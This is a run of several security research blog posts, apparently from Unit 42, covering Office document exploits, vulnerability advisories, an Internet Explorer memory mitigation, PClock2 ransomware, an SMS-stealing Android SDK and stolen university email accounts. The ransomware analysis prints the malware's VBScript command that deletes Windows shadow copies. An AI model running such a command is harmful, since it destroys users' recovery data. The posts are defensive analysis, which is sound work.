"In these types of attacks, the malicious Excel contains embedded Adobe Flash content which can trigger the Flash vulnerability and execute embedded shellcode."
Microsoft Equation Editor
"In a similar way to embedding Adobe Flash files into an Office document, you can also embed equations in documents that will be parsed by Microsoft Equation Editor - a program that lets you easily write mathematical equations: Figure 2. Microsoft Equation Editor As in our previous example, vulnerabilities in the equation editor can be exploited by leveraging malicious Office documents."
"We’ve seen examples of this just recently, when CVE-2017-11882 was exploited in the wild, paving the way to other exploits like CVE-2018-0802, both of which exploit flaws in the equation editor, enabling attackers to get from the user opening an Office document to remote code execution."
"While still not seen in the wild, similar exploits in Microsoft Equation Editor, such as such as CVE-2018-0807 and CVE-2018-0798, were identified by Unit 42 researchers."
"Note that since the Microsoft Equation Editor runs as its own process (eqnedt32.exe), protections specific to Microsoft Office such as EMET and Windows Defender Exploit Guard are not effective by default, as they only protect Microsoft Office processes (such as winword.exe). OLE Objects & HTA Handlers"
OLE Objects & HTA Handlers are mechanisms Office documents use to make references to include other documents in their content.
"They can be used to compromise an endpoint in the following way: This functionality was leveraged in exploitation of CVE-2017-0199 - a Microsoft Office/WordPad remote code execution (RCE) vulnerability patched by Microsoft in September 2017, and was used in multiple campaigns, like this OilRig campaign."
Figure 3.
RTF files will look exactly like regular Word documents
"In addition to the previous OLE & HTA exploit, attackers discovered RTF files can also execute ‘text/html’ mime-type OLE objects using the MSHTML."
This means that RTF documents expose the same attack surface as Internet Explorer!
"Leveraging this logical vulnerability, known as CVE-2018-8174, allows attackers to execute arbitrary HTML/JavaScript/VBScript."
"While code executed in this way is ‘sandboxed’ (where it cannot run new processes or write to the filesystem etc.), like other code running from Internet Explorer"
", this flaw can be used to leverage other vulnerabilities, such as a memory corruption UAF vulnerability in the VBScript engine, to gain arbitrary code execution in the context of the Word application (winword.exe), allowing them to gain control on the system."
Conclusion
"While document-based attacks have been a common attack vector for over a decade, we’re seeing a recent rise in their popularity and complexity."
"This rise may be a result of browser exploits becoming more difficult to use, due to the hardening done by browser developers."
No matter the reason
", it is important that organizations know how to defend against these common techniques."
Prevention Palo Alto Networks Traps advanced endpoint protection offers multiple methods of malware and exploit prevention to protect against these threats:
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address! Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
This has been a fun week.
We have not had a significant cyber event like this – something that affects just about everybody on the Internet -- since the Kaminsky DNS vulnerability of 2008.
"Everybody I know has been scrambling to understand what it means to their organization, to their business and to their immediate family."
"Yes, I said family."
I am sure I am not the only one who has answered a question or two from his mother-in-law about how the Internet is melting down based on what she’s been reading in the press.
"There’s a lot out there already about what Heartbleed means for the Web and beyond, and I’ll point you to our own analysis written by Scott Simkin or an essay by Dan Goodin over at ars technica for that explanation."
"Instead, here are eight things I am doing right now to protect Palo Alto Networks and my home (and mother-in-law) and that you should be doing, too:"
"If there’s a long-term consideration here, it’s to install perfect forward secrecy, as Twitter did last year."
That ensures that a session key derived from a stolen private key and a collected public key in the future will not be compromised.
"For more: Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"This post is also available in: 日本語 (Japanese) On Aug. 25, 2021, Atlassian released a security advisory for an injection vulnerability in Confluence Server and Data Center, CVE-2021-26084."
"If the vulnerability is exploited, threat actors could bypass authentication and run arbitrary code on unpatched systems."
"Since the release of this advisory, mass scanning activity has started to occur, seeking unpatched systems, and in-the-wild exploitation has begun."
Unit 42 recommends customers upgrade to the latest release of Confluence Server and Data Center.
The Atlassian products vulnerable to CVE-2021-26084 are those using the following versions of Confluence Server and Data Center: Confluence Cloud customers are not affected by this vulnerability.
"We recommend that customers update Atlassian Confluence Server and Data Center to the latest version, 7.13.0 (TLS)."
You can find the newest release on Atlassian’s download center.
"If you cannot install the latest upgrade, see the Mitigation section on the Atlassian security advisory for information on how to mitigate this vulnerability by running a script for the operating system your Confluence server is hosted on. Palo Alto Networks provides protection against the exploitation of this vulnerability: Palo Alto Networks will update this Threat Brief with new information and recommendations as they become available."
writeups/Confluence-RCE.md at main · httpvoid/writeups Confluence Server Download Archives Confluence Security Advisory - 2021-08-25 | Confluence Data Center and Server 7.13
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"This post is also available in: 日本語 (Japanese) On Sept. 14, 2021, Microsoft’s Security Response Center (MSRC) released security patches detailing the findings of four critical vulnerabilities affecting the Microsoft Azure package Open Management Infrastructure (OMI)."
"The open-source OMI package is designed to provide a portable infrastructure backbone for web-based management tools, such as diagnostic monitoring, log analytic services and automation functionality within UNIX and Linux systems."
"OMI is used by Microsoft Azure to manage UNIX packages within Azure virtual machines (VMs), containers and serverless cloud instances."
"According to Microsoft’s security release notes, any system created, or which has updated its OMI package, after Aug. 11, 2021, should automatically be patched."
"The four critical vulnerabilities discovered by security researchers from Wiz include one unauthenticated remote code execution (RCE) and three privilege escalation vulnerabilities. Dubbed OMIGOD, the four vulnerabilities were found to directly affect Azure cloud instances using the following Azure services: Prisma Cloud Compute Defender agents can detect whether any Azure system is vulnerable to any of the four CVEs."
"Additionally, Prisma Cloud users can also build a custom vulnerability detection rule to identify if any system is running an OMI package with a version previous to 1.6.8.1."
"To build a custom vulnerability detection rule, open Prisma Cloud and navigate to the following page: name,type,package,minVersionInclusive,maxVersionInclusive,md5 OMIGOD,package,omi,*,1.6.8.0, Palo Alto Networks Azure-based VM- and CN-Series Firewall instances do not use the OMI package and are not vulnerable to the OMI critical vulnerabilities."
Prisma Cloud will create an alert for any system which maintains an OMI package vulnerable to the OMI critical vulnerabilities.
"Should a system be identified as vulnerable, the following steps should be taken for that Azure Cloud Instance:"
"On Sept. 14, 2021, security researchers from Wiz released a report detailing the findings of four critical vulnerabilities affecting the Microsoft Azure package OMI."
"Dubbed OMIGOD, the four vulnerabilities were found to directly affect Azure Cloud Instances."
Palo Alto Networks Azure-based VM and CN Series Firewall instances do not use the OMI package and are not vulnerable to the OMI critical vulnerabilities.
Customers of Prisma Cloud have the ability to create alerts to detect vulnerabilities.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
Use-after-free bugs have affected Internet Explorer for years.
"In the past year alone, Microsoft patched 122 IE vulnerabilities, the majority of which were use-after-free bugs."
This year Microsoft has already patched 126 IE vulnerabilities to date.
"Of those vulnerabilities, 4 were actively being exploited in the wild."
"These 4 exploits (CVE-2014-1815, CVE-2014-1776, CVE-2014-0322, CVE-2014-0324) were all based on use-after-free bugs."
"To deal with the increasing number of use-after-free bugs and associated exploits, Microsoft introduced a series of new control mechanisms in the most recent Internet Explorer patches."
"In June, Microsoft introduced a new isolated heap mechanism to solve the usage issue of use-after-free exploitation."
They followed that up In July by implementing a deferred free method to solve the freeing issue of use-after-free bugs.
The main concept of an isolated heap is simple.
It allocates a dedicated heap for select critical objects to use that is separate from other heaps that a user can directly access.
The heap block will not be occupied by user-controlled data after the critical objects are freed.
This mechanism prevents precise control of the data of a freed object from further exploitation.
Figure 1. _g_hIsolatedHeap handle used for isolated heap
"The isolated heap was applied to many but not all internal objects, leaving some still vulnerable."
"To address this, Microsoft introduced another protection method of deferred free named ProtectedFree."
They encapsulate this method and apply it to almost every object in mshtml.dll.
"In IE9, for example, it has been applied to every object through MemoryProtection::HeapFree as shown in figure 2."
Figure 2.
References of MemoryProtection::HeapFree
The main idea of this protection mechanism is to delay the freeing action so that the intruder is unable to determine when they can occupy the freed object using controlled data.
"In this new patch, every time Internet Explorer tries to free an object, it is not freed immediately."
"Instead, the block to be freed is marked and filled with 0x00 data and added to a pool."
"When the size of the pool hits a predefined threshold, which is currently 100k (0x186A0 as highlighted in figure 3), it performs the real freeing operation (ReclaimUnmarkedBlocks). Figure 3."
C++ style pseudo code of ProtectedFree function
Microsoft stores the to-be-freed blocks in a structure called st_ProtecFreeManageHeap.
This structure is created in the function MemoryProtection::CMemoryProtector::ProtectCurrentThread and is used to manage deferred free heap blocks.
Figure 4 shows an example of the structure in memory.
Figure 4. st_ProtecFreeManageHeap Figure 5 provides an alternate view of the structure in a C style code block.
Figure 5. C style code of st_ProtecFreeManageHeap
"If we were able to make the size of the current heap block in this structure larger than the threshold of 0x186A0 bytes and trigger CMemoryProtector::ProtectedFree, it is still possible to force a true freeing action and occupy the freed object with other data as we show in the following piece of javascript code in figure 6. Figure 6. Javascript proof of concept to force freeing When creating the anchor element, the debug logs are shown in figure 7."
The address of the anchor element is 0x0c3b3f98.
Figure 7:
"Before free We then manually decrease the reference number, so the CMemoryProtector::ProtectedFree function will fill the block with 0’s, but the object is still not freed."
"Figure 8: decrease the reference number, not yet freed"
Finally we make the size of the CMemoryProtector::ProtectedFree management structure larger than 0x186a0 forcing the freeing operation.
Figure 9: field “TotalMemorySize” of st_ProtecFreeManageHeap is greater than threshold
The anchor element is now actually freed as shown in figure 10.
Figure 10: object is in the free list now
"From a researchers' point of view, deferred free created a few problems, one of the major ones being that the page heap feature may not work correctly."
Page heap is a useful feature for debugging.
"When page heap is turned on, the system allows only one object in one memory page."
Once this object is freed the whole page is marked as invalid.
So the next time IE tries to access a freed object an invalid address exception would be raised.
This mechanism is extremely helpful when researchers are trying to find use-after-free bugs.
"With the introduction of the deferred free patch the object is no longer truly freed, so the page still exists."
In this situation the researcher is no longer able to determine whether a use-after-free behavior has occurred because no exception would be thrown out.
"To reduce the impact of the deferred free patch, a research may consider patching the mshtml.dll in memory."
"For example, you can call MemoryProtection::CMemoryProtector::UnprotectProcess before you perform any fuzzing tasks."
The recent patches and introduction of isolated heap and deferred free are strong signs that Microsoft plans to address the fundamentals of use-after-free exploitation in a preventative manner rather than to passively patch the vulnerabilities as they are discovered.
"From the results of our research, applications of such methods can effectively stop unpatched use-after-free attacks."
It can also make the exploitations of heap overflows or type confusion bugs significantly more difficult.
But this is not the end.
"For the foreseeable future, Microsoft may introduce more defensive mechanisms against use-after-free bugs or even heap fengshui to reduce the risk of being exploited."
"Could it be game over for use-after-free exploitation, or it is just the beginning of another cat and mouse game?"
Time will tell.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"Today we’re releasing a new Unit 42 white paper titled “Credential-Based Attacks: Exposing the Ecosystem and Motives Behind Credential Phishing, Theft and Abuse.”"
"In this paper, we look at the problem of credential theft by exploring how it happens, what attackers do with credentials once they’ve stolen them, and what you can do to help prevent credential-based attacks."
"Credentials and authentication have become synonymous, with valid credentials allowing access to sensitive resources."
"Adversaries are increasingly stealing and using credentials as part of their playbooks; impersonating legitimate users to access a company’s most sensitive information, erase data on servers, and reconfigure them so that they can’t boot; and undertake other malicious activities."
"Stolen credentials underpin some of the most critical and damaging attacks out there; both Shamoon 2 and the Sofacy threat actor group, for example, have made detailed use of credential theft."
"Credential theft today can happen in many ways, but the most notable are through credential phishing and the use of malware like keyloggers (both staples of the Sofacy group), as well as password reuse."
"The impact of a successful credential theft is, ultimately, access and authorization."
"Attackers will use credential theft for remote access to an organization, to access cloud-based resources (which may have weaker credential protections than network-based resources), or to move laterally within an organization once they’ve gained entry."
"The most sophisticated attacks can – and do – blend these actions together, sometimes using multiple stolen credentials to penetrate networks, move laterally within them, elevate privileges, and then access and steal data. Prevention of credential theft is too often overlooked."
Organizations should continue with user education to help users better spot and not fall for phishing and spam attacks.
"You and your employees can also use password managers to make unique, complex passwords for each site not just a goal but a reality."
Technology is also catching up; recent advances in two-factor/multi-factor authentication (2FA/MFA) and one-time passwords (OTP) represent the best long-term approaches to preventing credential theft.
"(Our newest release, PAN-OS 8.0, also includes protections to significantly limit or eliminate password reuse.)"
Get your copy of our white paper here.
"Ignite '17 Security Conference: Vancouver, BC June 12–15, 2017 Ignite '17 Security Conference is a live, four-day conference designed for today’s security professionals."
"Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry."
"Visit the Ignite website for more information on tracks, workshops and marquee sessions."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"This post is also available in: 日本語 (Japanese) In January 2020, during the first Patch Tuesday of the new year, Microsoft released patches for 17 new vulnerabilities including one for CVE-2020-0601 known as Curveball."
The vulnerability exists in the Windows CryptoAPI (Crypt32.dll) and specifically relates to the method used for Elliptic Curve Cryptography (ECC) certificate validation.
"At the time of release, Microsoft affirmed that they had not yet seen the vulnerability exploited in the wild (ITW)."
Researcher Tal Be’ery released a blog titled “Win 10 Crypto Vulnerability: Cheating in Elliptic Curve Billiard 2” that does a fantastic job at explaining this bug.
"The patch provided by Microsoft included the typical release of operating system patches, but this time a new Application Programming Interface (API) function was added."
The new CveEventWrite function can be used to publish events when an attempt to exploit security vulnerabilities in user-mode applications occurs.
Analysts can collect alerts on the Application Message “CVE-2020-0601” as a means to hunt for attempted exploitation of this vulnerability on patched systems.
"We also recommend users of the Chrome browser to update to version 79.0.3945.130 as they recently released an update to fix the TLS issue. Palo Alto Networks customers running Traps are now safeguarded from the Windows CryptoAPI Spoofing vulnerability, regardless of whether they are running an unpatched Microsoft Windows 10 system."
"Additionally, Palo Alto Networks offers multiple, additional complementary protections:"
"As a member of the Microsoft Active Protections Program (MAPP) program, Palo Alto Networks received early details of the vulnerability, providing greater understanding of the threat, which helps us implement strong product coverage."
"As always, we recommend keeping your Microsoft products up to date with the latest patches to mitigate this vulnerability."
"Palo Alto Networks will update this Threat Brief with new information and recommendations as they become available. CVE-2020-0601: The ChainOfFools/CurveBall Attack Explained POC Win10 Crypto Vulnerability: Cheating in Elliptic Curve Billiards 2 NSA Cybersecurity Advisory Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"In the months since the WanaCrypt0r/WannaCry and the Petya/NotPetya attacks, security researchers have delved into the nuts and bolts these incidents and the malware involved."
One key thing that research into these security incidents shows is that these attacks used a relatively new and unknown technique called kernel APC attacks as part of their toolkit.
Kernel APC attacks occur in a way that increases the “stealth” factor and makes standard detection and prevention very difficult.
And kernel APC attacks do this while still maximizing the power and control that the code has on the target system.
"While kernel APC attacks aren’t well known and can be hard to understand, their proven success in WanaCrypt0r/WannaCry and the Petya/NotPetya make them an important threat to understand because proven attack techniques are quickly adopted widely."
And understanding is a first step to prevention.
"To understand what makes kernel APC attacks so dangerous, it’s important to understand what they are. The kernel is the heart of the operating system."
"When talking about operating systems with security permissions and controls like Windows or UNIX/Linux, the kernel operates with the highest level of control."
"Because of this, attacks against the kernel are used to gain complete control over a system, generally as part of an “elevation or privilege” (EoP) or “privilege escalation” attack."
"Typically, attacks against the kernel are used in conjunction with code execution attacks so that an attacker can target a limited privilege user but ultimately gain full control over the system."
Privilege escalation attacks against the kernel have been around for some time and are well-known and can be well protected against. Kernel APC attacks however are a different class of attack.
These don’t attack the kernel to gain privileges.
Instead kernel APC attacks already have kernel privileges and use them to further carry out their attack.
In this case by making legitimate programs execute malicious code rather than their own legitimate code.
Kernel APC attacks do this using their control over the kernel to redirect APCs: “Asynchronous Procedure Calls”.
APCs can basically be thought of as places in line for the CPU that the kernel gives access to.
"In a kernel APC attack, the attacker gives a legitimate program’s place in line to the attacker’s code."
The crux of what makes this attack technique so important is how the technique uses this level of control to have legitimate programs run illegitimate commands.
It’s easier to detect and prevent illegitimate programs (malware) from executing commands.
"But when legitimate programs execute illegitimate commands, it’s harder to detect and prevent: it’s not always clear whether a command is legitimate or not, and interfering with commands from legitimate programs can have significant (sometimes catastrophic) unintended consequences."
"And finally because of ways that kernel APC attacks are carried out, it doesn’t leave the usual fingerprints you find after an attack making detection harder still."
"Taken altogether, these make kernel APC attacks an effective and sophisticated technique."
And while this technique alone isn’t solely responsible for the damaging power of WanaCrypt0r/WannaCry and Petya/NotPetya it is certainly an important contributing factor.
"Perhaps more importantly, it’s a piece of those attacks that has escaped relative notice outside of some specialized parts of the research community."
New effective attack techniques that escape notice are always inviting for other copycat attackers.
A good way to defend against this is to understand and be aware of the thread: forewarned is forearmed.
"If you want a more detailed understanding of kernel APC attacks as they occurred in WanaCrypt0r/WannaCry, two good resources are Microsoft’s MMPC blog “WannaCrypt ransomware worm targets out-of-date systems” and Countercept’s “DOUBLEPULSAR Usermode Analysis: Generic Reflective DLL Loader”."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"In recent years, ransomware families are often glamorized as being some of the most dangerous types of malware."
"They’ve certainly caused a wealth of damage to end users with some of the more prominent malware families, such as CryptoLocker, CryptoWall, TorrentLocker, and TeslaCrypt infecting millions of users overall."
"For readers that might be unfamiliar with ransomware, it’s a type of malware that is responsible for encrypting a user’s files with a key known only to the attackers."
"Examples of files that might be encrypted include financial documents, home movies, photos, or business-related files."
"In order to decrypt these files, the victim must provide a ransom, or payment, to the attacker, often in the form of a digital currency."
"While ransomware is often thought to be bullet-proof, it is certainly not always the case."
"In early 2015, Emnisoft identified a new family of malware named PClock."
"At the time, the malware was riddled with issues, specifically in the way it encrypted files."
"It used a simple XOR encryption routine with a static key, allowing victims to easily recover their files without paying a ransom."
"In August, we started detecting updated copies of PClock, which has been improved upon by the malware author."
We set out to determine if this updated version of PClock holds up to some of the more prominent families.
"For the sake of clarity, I will refer to this newer version of PClock as PClock2 going forward."
The following sample is used for analysis: Figure 1.
PClock2
analysis sample PClock2 is written in Visual Basic.
"For a copy of this file’s IDA Pro database (idb), please refer here."
"When initially executed, PClock2 performs a very simple anti-analysis check where it will sleep for a random amount of time and compare the time spent sleeping against a set value."
This check is essentially looking for sandbox systems where the sleep function accelerates analysis.
Figure 2. Check by PClock2 for hooking of sleep function A simple check is performed to determine if the malware is running with administrative privileges.
"Once completed, the malware sends the result via an HTTP POST request to a remote server."
All data sent via HTTP POST requests is sent in the clear.
Figure 3. HTTP POST request containing administrative privileges
The ‘P0’ is statically set by the malware in the above request.
"The ‘1828’ represents the thread ID (TID) of the malware, while the ‘rnd’ GET variable is randomly generated."
"Throughout the runtime of PClock2, it makes multiple HTTP POST requests to a remote server using the same characteristics, including the ‘PO[TID]’ and the current time."
"Additionally, the user-agent used by the entire PClock family, including PClock2, is consistent across samples."
PClock2 proceeds to copy itself with the name “winjab.exe” in the following path.
"While this particular sample is seen installing itself to the %ALLUSERSPROFILE% path, other samples have been witnessed using %APPDATA% instead."
PClock2 also enables persistence by setting the following registry key.
All instances of the entire PClock family have been found to use this particular registry key.
"After installation is complete, the malware makes another HTTP POST containing the various file paths it used."
"Figure 4. HTTP POST request containing file paths of malware After installation, PClock2 will also set the following registry key with a value of ‘INSTALL_OK’."
This particular registry key is used to hold the latest state of the malware.
Other messages that might be present in this key include the following.
"The following registry keys are also used within the CLOCK sub-path by PClock2: PClock2 proceeds to use the API from blockchain.info to generate a unique Bitcoin (BTC) wallet identifier, which is configured to automatically forward payments to a hardcoded wallet identifier of ‘1MRfkK134ErfbcadUSoSUCBahngCqoBKju’."
The following HTTPS request accomplishes this.
PClock2 will also make a request to the following blockchain.info address to determine the current value of BTC.
This information is stored in the ‘\BData\B’ registry key as previously stated.
The malware proceeds to generate a unique key that will be used in subsequent file encryption using the following data: This data is concatenated to form a string similar to the following: Figure 5.
Data collected to be used in formation of unique key This data is then hashed using the SHA256 algorithm to generate a unique key.
This key is stored in the ‘\CData\C’ registry key as previously stated.
This key is also sent via a HTTP POST request.
Figure 6.
HTTP POST request containing unique SHA256 key PClock2 scans the file system of the victim in order to identify files that are to be encrypted.
"The following paths are ignored: Additionally, for a list of targeted file types, please see the following link."
"Once files are identified, PClock will begin encrypting them, one-by-one."
"Unlike the original version of PClock, this variant has forgone the simple XOR encryption routine in place of using RC4."
The RC4 key is generated by concatenating the SHA256 value previously generated with the path to the file being encrypted.
250dd811187959220220574a185ccf669e06c0ee3926773a7cb94750c401812cC:\Documents and Settings\Administrator\Desktop\Form1.cs
It should be noted that PClock takes a very long time to encrypt these files.
"On a test sandbox, the malware took upwards of 20 minutes to complete encryption, which is less than ideal for an attacker as it gives the victim time to notice the infection and stop it."
"By comparison, the latest version of the CryptoWall malware family takes roughly 1-3 minutes to complete its encryption routine."
"It’s also interesting to note that each time PClock2 scans a directory or encrypts a file, it makes an HTTP POST request to the C2 server."
"Figure 7. HTTP POST request indicating a folder is being scanned This resulted in over 1,000 requests being made on a sandbox machine, which contained little data of interest."
"After it finished the encryption routine, PClock2 generates a VBScript file in the following directory:"
"This script file contains the following commands, which will delete shadow copies on the Windows operating system."
"Set UAC = CreateObject(""Shell.Application"") UAC.ShellExecute ""vssadmin"", ""Delete Shadows /All /Quiet"", """", ""runas"", 1 On Windows XP, the following dialog box appears to the victim when this script runs, making it fairly apparent that something suspicious is occurring: Figure 8."
Dialog box that appears to victim when VBS attempts to run
"After running the clean up script the malware overwrites the ‘\CData\C’ registry key with a value of zero, which removes the unique SHA256 key."
"Finally, the malware changes the victim’s wallpaper and generates a GUI instructing the victim how they can provide payment and retrieve their files."
This dialogue mimics the more-capable “CryptoLocker” malware family and provides instructions in both English and Spanish.
Figure 9.
Ransom demand
"I originally wished to determine if the new version of PClock, PClock 2, included enough improvements to compete with some of the larger ransomware malware families, such as CryptoWall, TeslaCrypt, or TorrentLocker."
"In truth, this version has made a number of improvements, such as adding more file types to target, ignoring certain directories, and using a better encryption routine."
"However, a number of strong issues still plague this malware family, such as the following: While this version is an improvement, it still lacks many of the features and stealth that are currently present in the larger ransomware families."
"While ransomware is a large problem for users, it’s important to realize that not all malware families are created equal."
"Like most things in life, malware comes in many shapes and forms, from the more elegant and robust solutions, to those that come up lacking."
All PClock malware family samples are properly classified as malicious by WildFire.
AutoFocus users can find more information on samples and indicators related to this attack by viewing the PClock tag.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
Mobile app creators are often looking for ways to monetize their software.
One of the most common ways to do this is by displaying advertisements to users or by offering in-app purchases (IAPs).
Mobile monetization platforms create software libraries that authors can embed into their apps to start earning money quickly.
"We previously highlighted the dangers of installing apps that enable IAPs using SMS messages, as these apps typically have access to all SMS messages sent to the phone."
"While not all SMS-based IAP applications steal user data, we recently identified that the Chinese Taomike SDK has begun capturing copies of all messages received by the phone and sending them to a Taomike controlled server."
"Since August 1, Palo Alto Networks WildFire has captured over 18,000 Android apps that contain this library."
"These apps are not hosted inside the Google Play store, but are distributed via third party distribution mechanisms in China."
Background WildFire captures many samples of mobile malware that intercept and upload SMS messages.
Most of these are created by malware authors who set up command and control (C2) servers with third party hosting providers and frequently update their locations to avoid detection.
Among these malware we have found many that are created by “mobile monetization” companies who distribute apps that provide little value but have a high cost to the user.
"These apps are often installed by tricking users into clicking a pop-up, only to find later that a charge has appeared on their phone bill."
"Antivirus programs typically identify these apps as malware, the topic of this blog is something different and harder to detect."
Taomike is a Chinese company that aims to become the biggest mobile advertisement solution platform in China.
They provide an SDK and services to help developers display rich advertisements with a high pay rate.
"Taomike has not previously been associated with malicious activity, but a recent update to their software added SMS theft functionality."
"The apps this library is embedded in may be legitimate and have significant functionality, but their developer’s choice to use this library has put them at risk. Technical Details:"
SMS Theft
Not all apps that use the Taomike library steal SMS messages.
"Our analysis indicates that only samples that contain the embedded URL, hxxp://112.126.69.51/2c.php have this functionality."
"This is the URL to which the software uploads SMS messages, and the IP address belongs to the Taomike API server used by other Taomike services."
"We have captured around 63,000 Android apps in WildFire that include the Taomike library but only around 18,000 include the SMS theft functionality."
We believe there are different versions of the Taomike SDK and only some of them include SMS uploading behavior.
"Based on our data, the version that contains the SMS stealing functions is newer and was released around August 2015."
Apps that use earlier versions of the library appear to be safe.
"The Taomike library is called “zdtpay” and is a component of Taomike’s IAP system. Because Android apps are required to list the permissions they need in their manifest file, we can see that this library requires both SMS and network related permissions."
The library also registers a receiver named com.zdtpay.Rf2b for both the SMS_RECEIVED and BOOT_COMPLETED actions with highest priority of 2147483647.
Figure 1.
Registered receiver for SMS_RECEIVED The registered receiver Rf2b reads SMS messages whenever they arrive.
The message body and sender phone number are collected as shown in Figure 2. Figure 2.
SMS body and sender number read
"If the device has just booted, it will start the service MySd2e, which then registers a receiver for Rf2b as shown in Figure 3."
Figure 3.
MySd2e Service registers receiver for Rf2b
SMS information collected by the receiver is saved in a hashmap with “other” as the key and sent to a method that uploads the message to 112.126.69.51 as shown in Figure 4.
Figure 4. Information uploaded to IP Address used by api.taomike.com
"All SMS messages sent to the phone are uploaded, not just those that are relevant to Taomike’s platform."
Figure 5 shows a packet capture of a test message upload.
The message content is “hey test msg” as circled with dashed red box.
Figure 5.
"SMS uploaded via HTTP in pcap The Taomike library makes contact with the following URLs, but only the “2c.php” path is used to capture SMS messages."
The rest appear to be used for other parts of the IAP functionality in the library.
Risks and Mitigation
"We have captured over 18,000 samples that contain the SMS stealing library since August 2015, meaning the number of affected users is considerable."
We expect the number of affected apps and users to increase as more developers incorporate the newer version of Taomike library.
The infected apps are not limited to a single developer or third party store as many developers appear use the Taomike library.
Some of the infected apps purport to contain or display adult content.
"We do not know how Taomike is using the stolen SMS messages, but no library should capture all messages and send them to a system outside the phone."
In version 4.4 of Android (KitKat) Google began preventing apps from capturing SMS messages unless they were defined as the “default” SMS app.
Users outside of China and those that only download apps from the official Google Play store are not at risk from this threat.
"To protect Palo Alto Networks customers from the Taomike SMS stealer, we’ve made the following protections available:"
Conclusion Even popular third party monetization platforms are not always trustworthy.
When developers incorporate the libraries into their apps they need to carefully test them and monitor for any abnormal activities.
Identifying monetization and advertising platforms that behave poorly and abuse their users is something that our industry must to do ensure the safety of all mobile devices and their users.
Acknowledgement We greatly appreciate the help from Rongbo Shao from Palo Alto Networks in working on the Threat Prevention signature.
"We would also like to thank Ryan Olson, Benjamin Small, Richar Wartell, and Chris Clark from Palo Alto networks in publishing the discovery."
"Related Sample Hash Values Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address! Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"Recently, we found email accounts from top universities across the world being sold on Taobao, the largest consumer-to-consumer (C2C) e-commerce platform in China."
"Advertised uses for these accounts included registering for special accounts under software developer programs, receiving student discounts or coupons from retailers, and obtaining access to academic databases."
"This post describes the scope, associated risks, and implications of this activity."
"Our investigation began with a Chinese language search for ""edu mailbox"" in Taobao, which returned 99 results related to stolen university email accounts."
"The most expensive account was listed at ¥2400 RMB ($390.80 USD), while the cheapest was only ¥0.98 RMB ($0.16 USD). Figure 1: Results for Chinese language ""edu mailbox"" search on Taobao."
"These accounts, which include an education (EDU) top-level domain email address with valid password, represent 42 of the world’s top universities, across 10 countries:"
The descriptions for these items proposed three main uses for buyers:
1. Registering for special accounts under software developer programs:
"For example, the most popular account type, which has been bought at least 569 times, was advertised as a Microsoft’s student Windows Phone 7 and 8 developer account."
"By using this kind of account, a user can perform a developer unlock on their Windows Phone devices without incurring a fee."
"Most reviews of this package were favorable, with comments like ""very good to use"" or ""with seller’s help I can unlock my phone now."""
Figure 2: The most popular account type has sold at least 569 times.
2. Receiving student discounts or coupons from retailers:
"Some accounts advertised candidacy towards registration for student discount at retailers such as Amazon, BestBuy, Apple, and Dell."
"For example, the standard annual fee for Amazon Prime is $99 USD; however, with the student discount, a buyer could enjoy it for free the first six months and then renew at half price for subsequent years."
Figure 3: The seller showed how to register for student discount accounts.
3. Obtaining access to academic databases:
"Accounts for big universities (e.g., MIT, Stanford, etc.) are mainly used to access respective library services and resources, ""including research help, study spaces, print and electronic books/journals and more."""
Figure 4:
A seller advertises how an MIT account can be used to access online library resources.
"We talked with some sellers through AliWangWang, an instant message (IM) system developed by Taobao for online trading."
A well-stocked seller told us that every account he sold belonged to an active student at the respective university.
"He claimed that once the account was sold, only the one buyer and the legitimate user would have access."
He recommended not changing the account password to avoid detection by the legitimate user.
Another seller offered to provide real identity information for a stolen account so the buyer could change the corresponding password and security questions.
"This type of account access was the most expensive and least flexible in terms of customization (i.e., username, institution, etc.)."
"Additionally, it should be noted that there is value beyond the EDU account itself for password and security question information, in the event they are shared across other online accounts for the legitimate user."
Other sellers were also able to offer customizable email accounts from a specific domain/institution.
Figure 5: A seller advertising a customizable “xxx.edu” email account.
"In the above advertisement, the seller describes the ability to choose an account under a subdomain (academia, student, me, email, or contact) of the requested domain."
"The price for this custom account was only ¥27 RMB ($4.40 USD); for an extra ¥13 RMB ($2.12 USD), the buyer can request a custom username at any subdomain for the given institution."
"To further assess this threat, we purchased a customized, new account from a seller on Taobao."
"Four hours later, we received confirmation that the custom email address ""claud@student.cnri.edu"" was active."
"Navigating to CNRI’s webmail page, we were then able to successfully access and send an email from that account."
Figure 6: Sending an email through a newly bought customized EDU account.
"Another noteworthy trend we observed was that some sellers provided email addresses with customizable usernames at ""californiacolleges.edu""."
"In fact, anyone can do the same by visiting the California Colleges Create an Account page."
"Accounts made through this site ""can be used to apply [for] related memberships of Amazon Prime, Microsoft Developer, Adobe and Apple by some secret ways,"" one seller said."
Figure 7: Using a newly created California Colleges account.
"As with most criminal enterprises, not all sellers on Taobao use their real identity, presenting a challenge in tracking down the individuals behind this activity."
